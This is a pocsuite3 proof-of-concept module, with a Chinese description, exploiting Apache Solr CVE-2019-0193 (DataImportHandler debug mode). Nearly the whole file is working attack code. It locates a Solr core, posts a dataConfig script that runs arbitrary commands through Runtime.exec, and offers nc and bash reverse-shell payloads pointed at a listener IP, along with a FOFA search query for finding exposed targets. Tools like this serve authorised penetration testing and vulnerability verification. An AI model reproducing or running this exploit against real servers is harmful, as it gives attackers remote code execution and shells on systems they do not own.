"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import base64, json, time, re
from pocsuite3.lib.core.data import logger
from pocsuite3.lib.core.common import encoder_bash_payload
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, CEye
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text, random_str

class DemoPOC(POCBase):
    vulID = '17'  
    author = ['PeiQi']
    name = 'Apache Solr Debug-Mode 远程执行漏洞 CVE-2019-0193'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。'''
    appPowerLink = 'Fhem'
    appName = 'Apache Solr'
    appVersion = '< 8.2.0'
    fofa_dork = {'fofa': 'app="APACHE-Solr"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": "nc {} {} -e /bin/sh".format(get_listener_ip(), get_listener_port()),
            "bash": REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()),
        }
        o["cmd"] = OptString("id", description='自定义命令执行')
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/dataimport"
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                data_2 = """command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>


  <dataSource type="URLDataSource"/>
  <script><![CDATA[

          function poc(row){

 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("%s").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\\n\\r"));

return row;

}


  ]]></script>

        <document>
             <entity name="entity1"
                     url="https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml"
                     processor="XPathEntityProcessor"
                     forEach="/RDF/item"
                     transformer="script:poc">
                        <field column="title" xpath="/RDF/item/title" />
             </entity>
        </document>
</dataConfig>""" % self.get_option("cmd")
                resp = requests.post(url_2, data=data_2, headers=headers_2, timeout=8)
                if "uid=" in resp.text and resp.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url_2
                    result['VerifyInfo']['Cmd'] = self.get_option("cmd")
                    result['VerifyInfo']['Response'] = re.findall(r'"title":\["(.*)\\n', resp.text, re.S)[0]

        except Exception as ex:
            pass

        return self.parse_output(result)

    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/dataimport"
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                data_2 = """command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>


  <dataSource type="URLDataSource"/>
  <script><![CDATA[

          function poc(row){

 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("%s").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\\n\\r"));

return row;

}


  ]]></script>

        <document>
             <entity name="entity1"
                     url="https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-PocSuite3/main/VulnTest/CVE-2019-0193.xml"
                     processor="XPathEntityProcessor"
                     forEach="/RDF/item"
                     transformer="script:poc">
                        <field column="title" xpath="/RDF/item/title" />
             </entity>
        </document>
</dataConfig>""" % self.get_option("cmd")
                resp = requests.post(url_2, data=data_2, headers=headers_2, timeout=8)
                if resp.status_code == 200 and "title" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url_2
                    result['VerifyInfo']['Cmd'] = self.get_option("cmd")
                    result['VerifyInfo']['Response'] = re.findall(r'"title":\["(.*)\\n', resp.text, re.S)[0]

        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _shell(self):
        cmd = self.get_option("payload")
        self._exploit(cmd)
    
    def _exploit(self, cmd):
        result = {}
        url = self.url.rstrip('/') + "/solr/admin/cores?indexInfo=false&wt=json"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if "name" in resp.text and resp.status_code == 200:
                core_name = list(json.loads(resp.text)["status"])[0]
                url_2 = self.url.rstrip('/') + "/solr/" + core_name + "/dataimport"
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                data_2 = """command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("%s");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>""" % encoder_bash_payload(cmd).replace("'","")
                resp = requests.post(url_2, data=data_2, headers=headers_2, timeout=8)

        except Exception as ex:
            pass
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)